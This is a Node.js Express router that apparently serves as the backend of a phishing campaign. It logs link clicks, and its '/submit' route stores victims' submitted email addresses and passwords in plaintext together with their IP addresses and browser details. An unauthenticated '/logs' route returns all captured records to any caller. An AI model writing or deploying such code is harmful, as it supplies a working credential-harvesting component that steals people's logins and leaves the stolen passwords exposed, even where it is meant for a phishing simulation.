const express = require('express');
const router = express.Router();
const PhishingLog = require('../models/PhishingLog');
const useragent = require('useragent');

// Log click
router.post('/click', async (req, res) => {
  try {
    const { user_id } = req.body;

    const log = new PhishingLog({
      user_id,
      clicked: true,
      ip_address: req.ip,
      user_agent: req.headers['user-agent'],
    });

    await log.save();
    res.status(200).json({ message: 'Click logged.' });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// Log credential submission
router.post('/submit', async (req, res) => {
  try {
    const { user_id, email, password } = req.body;

    const log = new PhishingLog({
      user_id,
      email,
      password,
      submitted_credentials: true,
      ip_address: req.ip,
      user_agent: req.headers['user-agent'],
    });

    await log.save();
    res.status(200).json({ message: 'Credential submission logged.' });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// ✅ Get all logs
router.get('/logs', async (req, res) => {
  try {
    const logs = await PhishingLog.find().sort({ timestamp: -1 });
    res.status(200).json(logs);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ✅ Export the router after all routes
module.exports = router;
